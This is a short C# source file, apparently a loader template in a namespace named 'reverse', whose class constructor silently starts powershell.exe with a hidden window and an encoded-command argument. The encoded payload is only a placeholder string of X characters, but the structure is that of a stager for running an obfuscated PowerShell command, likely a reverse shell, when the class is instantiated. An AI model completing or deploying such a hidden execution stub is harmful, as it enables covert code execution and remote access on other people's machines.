using System;
using System.Diagnostics;

namespace reverse
{
    public class Run
    {
        public Run()
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-enc XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXxxxXXXXxxXXXxxxx",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = new Process { StartInfo = psi })
            {
                process.Start();
            }
        }

        public static void Main()
        {
        }
    }
}
